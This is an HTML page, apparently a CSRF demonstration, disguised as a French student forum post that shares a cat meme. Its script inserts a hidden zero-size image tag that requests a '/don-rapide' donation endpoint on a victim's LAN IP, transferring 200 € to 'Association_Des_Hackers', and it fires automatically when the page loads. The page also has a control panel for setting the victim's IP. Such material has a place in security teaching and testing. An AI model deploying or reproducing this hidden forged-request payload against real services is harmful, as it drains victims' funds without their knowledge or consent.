<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Forum des Étudiants Informatique - Partage de Mèmes</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #fdf2f8; margin: 0; padding: 25px; color: #374151; }
        .forum-card { max-width: 700px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
        h1 { color: #86198f; font-size: 22px; border-bottom: 2px solid #fbcfe8; padding-bottom: 10px; }
        .post { background: #fdf4ff; border-left: 4px solid #db2777; padding: 15px; border-radius: 4px; margin-top: 15px; }
        .author { font-weight: bold; color: #831843; margin-bottom: 8px; }
        .config-box { background: #fdf4ff; border: 1px dashed #f472b6; padding: 12px; border-radius: 6px; margin: 20px 0; font-size: 13px; }
        .badge { background: #be185d; color: white; padding: 3px 8px; border-radius: 4px; font-size: 11px; }
    </style>
</head>
<body>

    <div class="forum-card">
        <h1>💬 Forum Étudiant - Sujet : « Meilleur mème de débuggage »</h1>
        
        <div class="config-box">
            ⚙️ <strong>Configuration Attaque LAN (IP du PC Victime) :</strong>
            <input type="text" id="targetIp" style="padding: 4px; width: 130px;">
            <button onclick="armerBaliseImage()" style="padding: 5px 10px; background:#db2777; color:white; border:none; border-radius:4px; cursor:pointer;">Insérer l'image piégée</button>
            <div id="status" style="margin-top: 6px; font-size: 12px; color: #9d174d;"></div>
        </div>

        <div class="post">
            <div class="author">Auteur : Pseudo_Hacker_99 <span class="badge">Membre VIP</span></div>
            <p>Voici la photo de mon chat quand mon code compile du premier coup en C++ :</p>
            
            <!-- IMAGE INOFFENSIVE VISIBLE -->
            <img src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?w=500&auto=format&fit=crop&q=60" alt="Chat mignon" style="max-width: 100%; border-radius: 8px;">

            <!-- BALISE IMAGE CSRF PIÉGÉE -->
            <div id="imagePiegeContainer"></div>
        </div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        let targetIp = params.get('target') || localStorage.getItem('csrf_lan_ip') || window.location.hostname;
        document.getElementById('targetIp').value = targetIp;

        function armerBaliseImage() {
            const ip = document.getElementById('targetIp').value.trim();
            if (!ip) return alert("Veuillez saisir l'IP de la victime !");
            localStorage.setItem('csrf_lan_ip', ip);

            const attackUrl = `http://${ip}:5000/don-rapide?dest=Association_Des_Hackers&montant=200`;
            
            const img = document.createElement('img');
            img.src = attackUrl;
            img.width = 0;
            img.height = 0;
            img.style.display = "none";

            document.getElementById('imagePiegeContainer').appendChild(img);
            document.getElementById('status').innerText = `[✓] Balise <img src="${attackUrl}"> injectée dans le DOM ! Le débit de 200 € a été envoyé au chargement.`;
        }

        window.onload = function() {
            if (targetIp && targetIp !== "localhost" && targetIp !== "127.0.0.1") {
                armerBaliseImage();
            }
        };
    </script>
</body>
</html>
